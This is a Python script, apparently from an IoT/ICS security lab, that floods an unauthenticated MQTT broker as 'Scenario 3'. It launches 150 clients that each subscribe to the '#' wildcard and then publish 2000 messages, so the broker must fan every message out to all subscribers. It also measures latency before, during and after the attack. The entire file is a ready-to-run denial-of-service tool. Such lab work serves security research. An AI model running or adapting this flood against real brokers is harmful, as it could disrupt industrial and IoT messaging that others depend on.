#!/usr/bin/env python3
"""
03_dos.py - DoS Attack (INSECURE environment)

Subscription amplification attack:
  1. All FLOOD_CONNECTIONS workers connect and subscribe to '#'.
  2. Once all subscriptions are active, every worker starts publishing.
  3. The broker must route each published message to ALL N subscribers,
     creating an N-fold fanout: 150 workers × 2000 msgs = 300 K publishes,
     each triggering 150 deliveries → 45 M routing operations total.

Without authentication or rate limiting the broker has no defence.
MITRE ATT&CK ICS: T0814 Denial of Service
"""

import paho.mqtt.client as mqtt
import threading
import time
import json
import os
from datetime import datetime, timezone

BROKER_HOST       = os.getenv("BROKER_HOST", "172.20.0.20")
BROKER_PORT       = int(os.getenv("BROKER_PORT", 1883))
FLOOD_CONNECTIONS = 150
MSGS_PER_CLIENT   = 2000
FLOOD_TOPIC       = "attack/dos/flood"
LATENCY_TOPIC     = "metrics/dos/latency"
OUTPUT_DIR        = "/attacker/results"
FLOOD_PAYLOAD     = "X" * 256   # larger payload → more memory pressure per message

latency_samples  = []
messages_sent    = [0]
subscribed_count = [0]
all_subscribed   = threading.Event()
lock             = threading.Lock()
monitor_running  = threading.Event()
monitor_running.set()
current_phase    = ["baseline"]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def latency_monitor():
    received  = threading.Event()
    send_time = [0.0]

    def on_connect(c, u, f, rc, p):
        if rc == 0:
            c.subscribe(LATENCY_TOPIC, qos=0)

    def on_message(c, u, msg):
        lat = round((time.time() - send_time[0]) * 1000, 2)
        latency_samples.append({"ts": datetime.now().isoformat(),
                                 "ms": lat, "phase": current_phase[0]})
        received.set()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dos_monitor")
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(0.5)
        while monitor_running.is_set():
            received.clear()
            send_time[0] = time.time()
            client.publish(LATENCY_TOPIC, "probe", qos=0)
            if not received.wait(timeout=3.0):
                # Timeout — broker not responding
                latency_samples.append({"ts": datetime.now().isoformat(),
                                         "ms": 3000, "phase": current_phase[0]})
            time.sleep(0.5)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[!] Monitor error: {e}")


def flood_worker(worker_id):
    """
    Connect, subscribe to '#', then flood-publish once all workers are ready.

    Subscribing to '#' before publishing creates the amplification effect:
    every message sent by any worker is routed by the broker back to all
    FLOOD_CONNECTIONS subscribers, multiplying broker routing work by N.
    """
    def on_connect(c, u, f, rc, p):
        if rc == 0:
            c.subscribe("#", qos=0)

    def on_subscribe(c, u, mid, granted_qos, p):
        with lock:
            subscribed_count[0] += 1
            if subscribed_count[0] >= FLOOD_CONNECTIONS:
                all_subscribed.set()

    try:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                             client_id=f"flood_{worker_id}")
        client.on_connect = on_connect
        client.on_subscribe = on_subscribe
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()

        # Wait until ALL workers have subscribed to '#' so the fanout is at
        # maximum amplitude from the very first published message.
        all_subscribed.wait(timeout=30)

        payload = json.dumps({"w": worker_id, "data": FLOOD_PAYLOAD})
        for i in range(MSGS_PER_CLIENT):
            client.publish(FLOOD_TOPIC, payload, qos=0)
            time.sleep(0.005)   # 5 ms between publishes → flood lasts ~10s per worker,
            if i % 100 == 0:    # ensuring overlap with the campaign measurement window
                with lock:
                    messages_sent[0] += 100

        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[-] Worker {worker_id} error: {e}")


def stats(phase):
    s = [x["ms"] for x in latency_samples if x["phase"] == phase]
    if not s:
        return {"count": 0, "avg": "N/A", "min": "N/A", "max": "N/A"}
    return {"count": len(s), "avg": round(sum(s)/len(s), 2),
            "min": round(min(s), 2), "max": round(max(s), 2)}


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_file = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    print("==============================================")
    print(" SCENARIO 3 - DoS Attack (INSECURE)")
    print("==============================================")
    print(f" Broker         : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Flood clients  : {FLOOD_CONNECTIONS}")
    print(f" Msgs/client    : {MSGS_PER_CLIENT}")
    print(f" Total publishes: {FLOOD_CONNECTIONS * MSGS_PER_CLIENT}")
    print(f" Technique      : Subscription amplification ('#') — {FLOOD_CONNECTIONS}x fanout")
    print(f" Auth required  : NO — anonymous access")
    print(f" TLS            : NO")
    print(f" Expected       : Broker saturated — latency spikes")
    print("==============================================\n")

    t_mon = threading.Thread(target=latency_monitor, daemon=True)
    t_mon.start()

    # Baseline
    log("[*] Collecting baseline latency (10s)...")
    time.sleep(10)
    bs = stats("baseline")
    log(f"[+] Baseline: avg={bs['avg']}ms  max={bs['max']}ms  samples={bs['count']}\n")

    # Connect all workers and subscribe to '#' first, then flood simultaneously
    log(f"[*] Connecting {FLOOD_CONNECTIONS} workers and subscribing to '#'...")
    current_phase[0] = "flood"
    threads = [threading.Thread(target=flood_worker, args=(i,))
               for i in range(FLOOD_CONNECTIONS)]
    for t in threads:
        t.start()

    while any(t.is_alive() for t in threads):
        alive = sum(1 for t in threads if t.is_alive())
        s = stats("flood")
        log(f"[~] Active: {alive}/{FLOOD_CONNECTIONS} | "
            f"Msgs sent: {messages_sent[0]} | "
            f"Subscribed: {subscribed_count[0]}/{FLOOD_CONNECTIONS} | "
            f"Latency avg={s.get('avg','N/A')}ms max={s.get('max','N/A')}ms")
        time.sleep(2)

    for t in threads:
        t.join()

    fs = stats("flood")
    log(f"[+] Flood complete: avg={fs['avg']}ms  max={fs['max']}ms  samples={fs['count']}\n")

    # Recovery
    current_phase[0] = "recovery"
    time.sleep(5)
    monitor_running.clear()
    time.sleep(1)
    rs = stats("recovery")
    log(f"[+] Recovery: avg={rs['avg']}ms  max={rs['max']}ms\n")

    d = (round((fs["avg"] - bs["avg"]) / bs["avg"] * 100, 1)
         if isinstance(fs["avg"], float) and isinstance(bs["avg"], float) and bs["avg"] > 0
         else "N/A")

    results = {
        "environment":      "insecure",
        "broker":           f"{BROKER_HOST}:{BROKER_PORT}",
        "flood_clients":    FLOOD_CONNECTIONS,
        "msgs_per_client":  MSGS_PER_CLIENT,
        "total_publishes":  FLOOD_CONNECTIONS * MSGS_PER_CLIENT,
        "fanout_factor":    FLOOD_CONNECTIONS,
        "latency_baseline": bs,
        "latency_flood":    fs,
        "latency_recovery": rs,
        "degradation_pct":  d,
        "messages_sent":    messages_sent[0],
        "auth_required":    False,
        "tls":              False,
        "all_samples":      latency_samples,
    }
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 3 (INSECURE)")
    print("==============================================")
    print(f" Technique        : Subscription amplification ('#')")
    print(f" Fanout factor    : {FLOOD_CONNECTIONS}x")
    print(f" Baseline latency : avg={bs['avg']}ms  max={bs['max']}ms")
    print(f" Flood latency    : avg={fs['avg']}ms  max={fs['max']}ms")
    print(f" Recovery latency : avg={rs['avg']}ms")
    print(f" Degradation      : {'+' if isinstance(d, float) and d > 0 else ''}{d}%")
    print(f" Messages sent    : {messages_sent[0]}")
    print(f" Result           : ATTACK SUCCEEDED — broker saturated")
    print(f" Output           : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()
